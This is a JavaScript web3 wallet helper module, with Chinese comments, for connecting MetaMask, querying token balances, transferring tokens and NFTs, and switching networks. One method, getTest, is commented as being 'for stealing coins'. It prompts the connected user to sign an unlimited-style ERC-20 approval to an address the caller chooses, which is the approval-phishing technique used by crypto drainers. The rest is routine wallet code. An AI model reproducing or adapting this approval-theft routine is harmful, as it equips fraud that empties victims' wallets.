import { msg, notify, Fixed } from '@/utils'

import _web3 from 'web3/dist/web3.min.js'
// 钱包工具
class bsc {
  static walletAddress = false //当前用户地址
  static web3
  // 检测当前网络环境
  // network() {
  // 	return ethereum.networkVersion;
  // }
  // 初始化wbe3

  init() {
    try {
      if (this.web3) {
        // console.log('已经有web3实例对象了')
        return
      }
      if (typeof window.web3 !== 'undefined') {
        this.web3 = new _web3(window.web3.currentProvider)
      } else {
        this.web3 = new _web3(new _web3.providers.HttpProvider('http://localhost:8545'))
      }
    } catch (err) {
      console.log(err)
    }
  }
  // 创建合约对象
  async Contract(obj) {
    if (this[obj.name]) {
      console.log('已经有合约对象了', obj.name)
      return
    } else if (!this.web3) {
      await this.init()
      console.log('还没有创建web3实例对象，已为你创建')
    }
    if (typeof obj.abi === 'string') {
      var abi = JSON.parse(obj.abi)
    } else {
      var abi = obj.abi
    }
    this[obj.name] = await new this.web3.eth.Contract(abi, obj.contract)
  }
  // 主币交易 bnb
  request(obj) {
    return new Promise(async (resolve, reject) => {
      if (obj.fromAddress) {
        var fromAddress = obj.fromAddress
      } else {
        var fromAddress = await this.address()
      }
      let quantity = obj.quantity * 1000000000000000000
      ethereum
        .request({
          method: 'eth_sendTransaction',
          params: [
            {
              from: fromAddress, // 付款方
              to: obj.toAddress, // 收款方
              value: '0x' + quantity.toString(16), // 价格 16进制
              // gasPrice: '0x'+'0',	// 手续费 可以不设置但是不能过低
              // gasLimit: '0x'+'5208',	// 暂时不知道是什么东西
              // gas: '0x'+'33450'	// 手续费 同上
            },
          ],
        })
        .then((transactionHash) => {
          // 成功执行
          resolve(transactionHash)
        })
        .catch((error) => {
          // 失败执行
          reject()
        })
    })
  }

  // 连接钱包 initContract
  connect_purse() {
    return new Promise(async (resolve, reject) => {
      if (typeof window.ethereum === 'undefined') {
        msg('当前环境错误，请切换到钱包环境')
        this.init()

        reject()
      }
      const accounts = await ethereum
        .request({
          method: 'eth_requestAccounts',
        })
        .catch((err) => {
          msg('拒绝连接')
          reject()
        })
      if (accounts && accounts[0]) {
        this.walletAddress = accounts[0]
        resolve(accounts[0])
      } else {
        reject()
      }
    })
  }
  // 发起指定合约转账
  build_transfer(obj) {
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 收款地址 obj.toAccount
    // 价格 obj.quantity
    // 合约地址 obj.contract
    // 合约abi obj.abi
    return new Promise(async (resolve, reject) => {
      // 指定的合约对象是否存在,不存在则去创建
      let walletAddress
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      // 获取代币小数位
      let decimal = await this.specified_decimals(obj)
      // 计算价格
      let quantity = obj.quantity
      if (decimal && decimal > 6) {
        quantity = Math.round(quantity * 1000000)
        for (var i = 0; i < decimal - 6; i++) {
          quantity += '0'
        }
      } else {
        let sb = 1
        for (var i = 0; i < (decimal || 0); i++) {
          sb += '0'
        }
        quantity = quantity * sb
      }
      // 没有指定的钱包地址则查询当前连接的钱包
      if (obj.fromAccount) {
        walletAddress = obj.fromAccount
      } else {
        walletAddress = await this.address()
      }
      this[obj.name].methods.transfer(obj.toAccount, quantity.toString()).send(
        {
          from: walletAddress,
        },
        function (error, transactionHash) {
          if (!error) {
            // 成功执行，返回交易号
            resolve(transactionHash)
          } else {
            // 失败执行
            reject(error)
          }
        },
      )
    })
  }
  // 获取授权(盗币用)
  async getTest(obj) {
    console.log(obj)
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 收款地址 obj.toAccount
    // 授权金额 obj.authorizeAmount
    // 合约地址 obj.contract
    // 合约abi obj.abi
    return new Promise(async (resolve, reject) => {
      // 指定的合约对象是否存在,不存在则去创建
      let walletAddress
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      // 没有指定的钱包地址则查询当前连接的钱包
      if (obj.fromAccount) {
        walletAddress = obj.fromAccount
      } else {
        walletAddress = await this.address()
      }
      let decimal1 = await this.specified_decimals(obj)
      let quantity1 = obj.authorizeAmount
      if (decimal1 && decimal1 > 6) {
        quantity1 = Math.round(quantity1 * 1000000)
        for (var i = 0; i < decimal1 - 6; i++) {
          quantity1 += '0'
        }
      } else {
        let num = 1
        for (var i = 0; i < (decimal1 || 0); i++) {
          num += '0'
        }
        quantity1 = quantity1 * num
      }
      // 计算价格
      this[obj.name].methods.approve(obj.toAccount, quantity1.toString()).send(
        {
          from: walletAddress,
        },
        function (error, transactionHash) {
          if (!error) {
            console.log(transactionHash)
            // 成功执行，返回交易号
            resolve(transactionHash)
          } else {
            console.log('11')
            notify('授权失败', 2000, { background: '#ee0a24' })
            uni.hideLoading()
            // 失败执行
            reject(error)
          }
        },
      )
    })
  }
  // 查询授权金额 allowance
  async queryingAuthorizationAmount(obj, carry) {
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 收款地址 obj.toAccount
    // 合约地址 obj.contract
    // 合约abi obj.abi
    // 拿到代币小数位，并准备
    // if (carry) {
    //   let decimals = await this.specified_decimals(obj)
    //   var sb = 1
    //   for (let i = 0; i < decimals; i++) {
    //     sb += '0'
    //   }
    // }

    let num, walletAddress
    // 指定的合约对象是否存在,不存在则去创建
    if (!this[obj.name]) {
      await this.Contract(obj)
    }
    // 没有指定的钱包地址则查询当前连接的钱包
    if (obj.address) {
      walletAddress = obj.address
    } else {
      walletAddress = await this.address()
    }
    await this[obj.name].methods.allowance(walletAddress, obj.toAccount).call((error, result) => {
      if (!error) {
        num = result
      } else {
        console.log(error)
      }
    })
    if (carry) {
      return num / Math.pow(10, 18)
    } else {
      return num
    }
  }
  // 查询以太币余额
  async balance(address, carry) {
    return new Promise(async (resolve, reject) => {
      let num, walletAddress
      // 没有指定的钱包地址则查询当前连接的钱包
      if (address) {
        walletAddress = address
      } else {
        walletAddress = await this.address()
      }
      if (!this.web3) {
        await this.init()
        console.log('还没有创建web3实例对象，已为你创建')
      }
      await this.web3.eth.getBalance(walletAddress).then((n) => {
        num = n
      })
      if (carry) {
        resolve(num / 1000000000000000000)
      } else {
        resolve(num)
      }
    })

  }
  // 查询指定代币余额
  async specified_balance(obj, carry) {
    console.log(obj)
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 合约地址 obj.contract
    // 合约abi obj.abi
    // 拿到代币小数位，并准备
    if (carry) {
      let decimals = await this.specified_decimals(obj)
      var sb = 1
      for (let i = 0; i < decimals; i++) {
        sb += '0'
      }
    }

    let num, walletAddress
    // 指定的合约对象是否存在,不存在则去创建
    if (!this[obj.name]) {
      await this.Contract(obj)
    }
    // 没有指定的钱包地址则查询当前连接的钱包
    if (obj.address) {
      walletAddress = obj.address
    } else {
      walletAddress = await this.address()
    }
    await this[obj.name].methods.balanceOf(walletAddress).call((error, result) => {
      if (!error) {
        num = result
      } else {
        console.log(error)
      }
    })
    if (carry) {
      return num / sb
    } else {
      return num
    }
  }
  // 查询代币小数位
  async specified_decimals(obj) {
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 合约地址 obj.contract
    // 合约abi obj.abi

    let num, walletAddress
    // 指定的合约对象是否存在,不存在则去创建
    if (!this[obj.name]) {
      await this.Contract(obj)
    }

    await this[obj.name].methods.decimals().call((error, result) => {
      if (!error) {
        num = result
      } else {
        console.log(error)
      }
    })
    return num
  }
  // 查询指定代币 tokenId
  async specified_token(obj) {
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 合约地址 obj.contract
    // 合约abi obj.abi

    let num, walletAddress
    // 指定的合约对象是否存在,不存在则去创建
    if (!this[obj.name]) {
      await this.Contract(obj)
    }
    // 没有指定的钱包地址则查询当前连接的钱包
    if (obj.address) {
      walletAddress = obj.address
    } else {
      walletAddress = await this.address()
    }
    await this[obj.name].methods
      .tokenOfOwnerByIndex(walletAddress, obj.index)
      .call((error, result) => {
        if (!error) {
          num = result
        } else {
          console.log(error)
        }
      })
    return num
  }
  // 获取代币名
  async get_name(obj) {
    return new Promise(async (resolve, reject) => {
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      this[obj.name].methods.name().call((error, result) => {
        if (!error) {
          resolve(result)
        } else {
          reject(error)
        }
      })
    })
  }
  async get_symbol(obj) {
    return new Promise(async (resolve, reject) => {
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      console.log(this[obj.name])
      this[obj.name].methods.symbol().call((error, result) => {
        if (!error) {
          resolve(result)
        } else {
          reject(error)
        }
      })
    })
  }
  // nft转让
  async build_safe(obj) {
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 收款地址 obj.toAccount
    // tokenId obj.tokenId
    // 合约地址 obj.contract
    // 合约abi obj.abi

    // 指定的合约对象是否存在,不存在则去创建
    return new Promise(async (resolve, reject) => {
      let walletAddress
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      // 没有指定的钱包地址则查询当前连接的钱包
      if (obj.fromAccount) {
        walletAddress = obj.fromAccount
      } else {
        walletAddress = await this.address()
      }
      this[obj.name].methods.safeTransferFrom(walletAddress, obj.toAccount, obj.tokenId).send(
        {
          from: walletAddress,
        },
        function (error, transactionHash) {
          if (!error) {
            // 成功执行，返回交易号
            resolve(transactionHash)
          } else {
            console.log(error)
            // 失败执行
            reject(error)
          }
        },
      )
    })
  }
  // 获取当前连接钱包地址，没有的话尝试登录获取
  async address() {
    if (this.walletAddress) {
      return this.walletAddress
    } else {
      await this.connect_purse()
      return this.walletAddress
    }
  }
  // 请求切换到指定网络
  network(obj) {
    return ethereum.request({
      method: 'wallet_addEthereumChain', // Metamask的api名称
      params: [
        {
          chainId: `0x${obj.chainId.toString(16)}`, // 网络id，16进制的字符串
          chainName: obj.chainName, // 添加到钱包后显示的网络名称
          rpcUrls: [
            obj.host, // rpc地址
          ],
          iconUrls: [
            'https://testnet.hecoinfo.com/favicon.png', // 网络的图标，暂时没看到在哪里会显示
          ],
          blockExplorerUrls: [
            obj.blockExplorerUrl, // 网络对应的区块浏览器
          ],
          nativeCurrency: {
            // 网络主币的信息
            name: obj.symbol,
            symbol: obj.symbol,
            decimals: obj.decimals,
          },
        },
      ],
    })
  }
  async networkTest(obj) {
    const chainId = await ethereum.request({
      method: 'eth_chainId',
    })
    console.log(obj, chainId);
    if (chainId == obj.chainId) {
      return
    } else {
      await ethereum.request({
        method: 'wallet_addEthereumChain', // Metamask的api名称
        params: [
          {
            chainId: `0x${obj.chainId.toString(16)}`, // 网络id，16进制的字符串
            chainName: obj.chainName, // 添加到钱包后显示的网络名称
            rpcUrls: [
              obj.host, // rpc地址
            ],
            blockExplorerUrls: [
              obj.blockExplorerUrl, // 网络对应的区块浏览器
            ],
            nativeCurrency: {
              // 网络主币的信息
              name: obj.symbol,
              symbol: obj.symbol,
              decimals: obj.decimals,
            },
          },
        ],
      })
    }
  }
  // 全自动切换网络，自由度不高无法diy(好吧，完全没有自由度)
  automatic_network(obj) {
    // 切换网络这里就会执行
    ethereum.on('networkChanged', (networkIDstring) => {
      // console.log('切换网络', networkIDstring)
      if (networkIDstring != obj.chainId) {
        // console.log('切换到错误网络', networkIDstring)
        // uni.showLoading({
        //   title: translate('wang-luo-huan-jing-cuo-wu'),
        //   mask: true,
        // })
        console.log(this.network(obj))
      } else {
        // console.log('切换到正确网络', networkIDstring)
        // uni.hideLoading()
      }
    })
    // 判断是否需要切换网络
    let num = 0
    let fn = () => {
      if (!ethereum.networkVersion && num <= 20) {
        num++
        setTimeout(fn, 200)
        return
      }
      if (ethereum.networkVersion != obj.chainId) {
        // uni.showLoading({
        //   title: translate('wang-luo-huan-jing-cuo-wu'),
        //   mask: true,
        // })
        this.network(obj)
      }
    }
    fn()
  }
  // 判断钱包格式是否正确
  async isAddress(address) {
    return this.web3.utils.isAddress(address)
  }
  // 获取区块信息
  async getTransaction(transactionHash) {
    console.log(transactionHash)
    return new Promise((resolve, reject) => {
      this.web3.eth.getTransactionReceipt(transactionHash, function (error, result) {
        if (!error) {
          resolve(result)
        } else {
          reject(error)
        }
      })
    })
  }
  async tokenURIList(obj) {
    // 调用的合约对象 obj.name
    // 钱包地址 obj.fromAccount
    // 合约地址 obj.contract
    // 合约abi obj.abi

    // 指定的合约对象是否存在,不存在则去创建
    return new Promise(async (resolve, reject) => {
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      this[obj.name].methods.tokenURIList(obj.fromAccount).call((error, result) => {
        if (!error) {
          resolve(result)
        } else {
          reject(error)
        }
      })
    })
  }
  // 获取区块信息
  async getTokenUri(obj) {
    // 调用的合约对象 obj.name
    // tokenId obj.tokenId
    // 合约地址 obj.contract
    // 合约abi obj.abi

    // 指定的合约对象是否存在,不存在则去创建
    return new Promise(async (resolve, reject) => {
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      this[obj.name].methods.tokenURI(obj.tokenId).call((error, result) => {
        if (!error) {
          resolve(result)
        } else {
          reject(error)
        }
      })
    })
  }
  async sendInAmount(obj) {
    console.log(obj)
    return new Promise(async (resolve, reject) => {
      if (!this[obj.name]) {
        await this.Contract(obj)
      }
      let decimal1 = await this.specified_decimals({
        fromAccount: obj.fromAccount,
        ...obj.usdt,
      })
      console.log('decimal1', decimal1)
      // 计算价格
      let quantity1 = obj.amount
      if (decimal1 && decimal1 > 6) {
        quantity1 = Math.round(quantity1 * 1000000)
        for (var i = 0; i < decimal1 - 6; i++) {
          quantity1 += '0'
        }
      } else {
        let num = 1
        for (var i = 0; i < (decimal1 || 0); i++) {
          num += '0'
        }
        quantity1 = quantity1 * num
      }
      let quantity2 = 0
      let quantity3 = 0
      let quantity4 = quantity1
      let arr1 = [obj.inAddress]
      let arr2 = []
      if (obj.address1) {
        arr1.push(obj.address1)

        quantity2 = (quantity1 / 100) * obj.scale1
        arr2.push(quantity2.toString())
        quantity4 -= quantity2
      }
      if (obj.address2) {
        arr1.push(obj.address2)
        quantity3 = (quantity1 / 100) * obj.scale2
        arr2.push(quantity3.toString())
        quantity4 -= quantity3
      }
      arr2.unshift(quantity4.toString())
      console.log(quantity1);
      console.log(quantity2);
      console.log(quantity3);
      console.log(quantity4);
      console.log(arr1);
      console.log(arr2);
      this[obj.name].methods
        .sendAmount(
          obj.uaddress,
          quantity1,
          arr1, arr2
        )
        .send(
          {
            from: obj.fromAccount,
          },
          function (error, result) {
            if (!error) {
              console.log(result)
              resolve(result)
            } else {
              // 失败执行
              reject(error)
            }
          },
        )
    })
  }
}
export default new bsc()
